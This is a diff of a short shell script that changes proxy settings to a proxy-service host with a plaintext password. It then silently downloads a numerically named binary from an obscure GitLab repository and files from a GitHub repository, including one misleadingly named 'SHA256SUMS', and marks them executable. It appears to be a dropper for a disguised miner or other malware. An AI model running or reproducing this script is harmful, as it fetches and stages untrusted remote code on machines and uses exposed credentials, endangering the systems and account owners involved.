@@ -1,7 +1,7 @@
-proxy="149.50.222.86" 
+proxy="speedway.usefixie.com" 
 port="1080" 
-user="render"  
-pass="render"  
+user="fixie"  
+pass="Jc2jw1OwYtLoIiE"  
 wget -q -O 0380096015 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 0380096015
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
